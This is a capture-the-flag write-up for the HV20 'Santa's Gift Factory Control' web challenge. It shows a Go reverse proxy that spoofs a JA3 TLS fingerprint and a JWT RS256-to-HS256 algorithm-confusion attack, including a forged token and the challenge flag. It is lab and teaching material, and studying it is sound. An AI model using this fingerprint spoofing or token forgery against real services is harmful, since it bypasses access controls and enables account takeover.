[← Day 16](../day16/) / [↑ TOC](../README.md) / [→ Day 18](../day18/)


# Day 17 / HV20.17 Santa's Gift Factory Control



## Challenge

<!-- ...10....:...20....:...30....:...40....:...50....:...60....:...70....:. -->
* Author: fix86
* Tags:   `#crypto` `#web-security`
* Level:  Hard

Santa has a customized remote control panel for his gift factory at the north
pole. Only clients with the following fingerprint seem to be able to connect:

`771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0`


### Mission

Connect to Santa's super-secret control panel and circumvent its access
controls.

[Santa's Control Panel](https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land/)


### Hints

* If you get a `403 forbidden`: this is part of the challenge
* The remote control panel does client fingerprinting
* There is an information leak somewhere which you need to solve the challenge
* The challenge is not solvable using brute force or injection vulnerabilities
* Newlines matter, check your files



## Solution


### Overcoming the 403

Searching the web for the finger print number from the challenge description
unveils that it's a [JA3 finger print](https://github.com/salesforce/ja3).

There is only one project discoverable on the web that provides the means to
mimic a JA3 finger print. It's called [JA3Transport] and it's written in Go.
Here is a [blog post] kind of article about impersonating JA3 finger prints.

[JA3Transport]: https://github.com/cucyber/JA3Transport
[blog post]: https://medium.com/cu-cyber/impersonating-ja3-fingerprints-b9f555880e42

The project was used to ultimately build a proxy (thanks again _mcia_) thus
enabling to use a standard web browser while impersonating the JA3 finger print …

```go
package main

import (
	"fmt"
	"github.com/CUCyber/ja3transport"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
)

func main() {
	// start proxy
	http.HandleFunc("/", Proxy)
	fmt.Println("About to listen on port 8081...")
	log.Fatal(http.ListenAndServe(":"+"8081", nil))
}

func Proxy(res http.ResponseWriter, req *http.Request) {
	uri := "https://876cfcc0-1928-4a71-a63e-29334ca287a0.rdocker.vuln.land"
	serveReverseProxy(uri, res, req)
}

func serveReverseProxy(target string, res http.ResponseWriter, req *http.Request) {
	// parse the url
	uri, _ := url.Parse(target)
	tr, _ := ja3transport.NewTransport("771,49162-49161-52393-49200-49199-49172-49171-52392,0-13-5-11-43-10,23-24,0")

	proxy := httputil.NewSingleHostReverseProxy(uri)
	proxy.Transport = tr
	proxy.ServeHTTP(res, req)
}
```

Now that the page is accessible, it looks like this …

![](screenshot_login.png)


### Searching and finding an additional angle

After erratic attempts to find any aspect about this web page that could be
leveraged, finally the topic [JSON Web Token] came into the focus of attention.

[JSON Web Token]: https://en.wikipedia.org/wiki/JSON_Web_Token

While trying to login with the credentials `admin`/`admin`, two noticeable
things happened:

1. The browser was suddenly given a JSON Web Token cookie.
2. There was a strange message in the HTML source code …

   `<!--DevNotice: User santa seems broken. Temporarily use santa1337.-->`

   This is probably the info leak that is mentioned in the challenge hints.

There exists a set of [critical vulnerabilities regarding JSON Web Tokens][vuls]
that are – at least to me – astounding. The vulnerability that is used for this
challenge is the sweetest of the bunch.

[vuls]: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/

In a [JSON Web Token] there are at least the following two methods to sign and
verify a token: _RSA_ and _HMAC_. 

With _HMAC_ the idea is that the signing key is kept secret and is used only by
the server to verify authenticity.

With _RSA_ the signing key is a secret private key and the verification key is
a public key. Not only the server but everybody can verify the authenticity of
such tokens. The URL to the public key is even part of the token.

The vulnerability originates in the fact that the server side library that
handles the tokens can be told by the user that any given token was not signed
with the _RSA_ method (as previously published by the server) but was signed
with the _HMAC_ method. The fatality about this is that the server will
automatically assume, that the public _RSA_ key is a private _HMAC_ key and
will use it to verify the token. And since that key is public to anyone, the
attacker can use it to sign arbitrary tokens. How cool is that ? `(o_O)`


### Cookie modding

The genuine cookie that was received from the server is decoded into the
following structure …

```json
Header:
{
  "typ": "JWT",
  "alg": "RS256",
  "kid": "/keys/1d21a9f945"
}

Payload:
{
  "exp": 1609416502,
  "iat": 1609412902,
  "sub": "none"
}

Signature:
{
   [some bytes]
}
```

Next the public key is retrieved from the server …

```
$ curl -O http://localhost:8081/keys/1d21a9f945"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY
Ri7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb
SYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs+2tmcgui/bFn
wC+qByZtIlsP+rlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3
US8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq+tH95/9u
X/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw
zwIDAQAB
-----END PUBLIC KEY-----
```

At last a new cookie is forged (with the help of [CyberChef]) intentionally with
the _wrong_ signing method _HMAC_. This produces the following cookie header and
payload …

[CyberChef]: https://gchq.github.io/CyberChef/#recipe=JWT_Sign('-----BEGIN%20PUBLIC%20KEY-----%5CnMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0KDtdDsZ/wpGXWRnP6DY%5CnRi7OxTWiwPVg8eTsVcmbzAkk2r4itb3NqRw9xpJeUHorgfw1f9GkuAFg/squMrXb%5CnSYM0Vcxqmtsq379xCw6s0pxIafPR7TEAVRh5Mxrudl2lwiO4vJPs%2B2tmcgui/bFn%5CnwC%2BqByZtIlsP%2BrlT/MF2wLaWe/LNAWtOXdFVDOzUy6ylLZeL6fRtt9SiuUOQkkC3%5CnUS8TmvVQYcCcwvu4GBJeGdlKrbIuXIohl7hP5i9/KZ3kIvzByp/Xk5iq%2BtH95/9u%5CnX/9FHKUSrcRE4NYVRhkqHPpn/EbqXHMX0BM0QoGETORlpZIo/lAOQ7/ezOd9z1fw%5CnzwIDAQAB%5Cn-----END%20PUBLIC%20KEY-----%5Cn','HS256')&input=ewogICJleHAiOiAxNjA5NDE2NTAyLAogICJpYXQiOiAxNjA5NDEyOTAyLAogICJzdWIiOiAic2FudGExMzM3Igp9

```json
Header:
{
  "alg" : "HS256",
  "typ" : "JWT"
}

Payload:
{
  "exp": 1609416502,
  "iat": 1609412902,
  "sub": "santa1337"
}
```

The completely encoded cookie …

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDk0MTY1MDIsImlhdCI6MTYwOTQxMjkwMiwic3ViIjoic2FudGExMzM3In0.8QCk0LVJEEf-zieqEE6DPf3QM8nAgYmSqTw9Pei8Jvc
```

… is used to replace the cookie that was received from the server earlier.

Et voilà, the server thinks it's Santa and gives access:

![](screenshot_access.png)

The flag is in a comment in the HTML source code:

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Santa's Control Panel</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link href="static/bootstrap/bootstrap.min.css" rel="stylesheet" media="screen">
        <link href="static/fontawesome/css/all.min.css" rel="stylesheet" media="screen">
        <link href="static/style.css" rel="stylesheet" media="screen">
    </head>
    <!--Congratulations, here's your flag: HV20{ja3_h45h_1mp3r50n4710n_15_fun}-->
    <body class="loggedin">
        <nav class="navtop">
            <div>
```

--------------------------------------------------------------------------------

Flag: `HV20{ja3_h45h_1mp3r50n4710n_15_fun}`

[← Day 16](../day16/) / [↑ TOC](../README.md) / [→ Day 18](../day18/)
